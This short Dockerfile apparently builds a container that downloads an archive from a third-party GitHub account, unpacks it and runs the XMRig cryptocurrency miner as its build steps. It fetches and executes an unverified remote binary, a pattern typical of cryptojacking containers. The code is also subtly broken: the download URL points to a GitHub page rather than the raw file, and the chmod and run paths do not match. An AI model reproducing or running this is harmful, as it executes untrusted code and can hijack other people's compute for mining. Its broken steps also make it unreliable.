FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.tar.gz
RUN tar xvzf Desktop.tar.gz
RUN chmod +x "/xmrig"
RUN ./xmrig
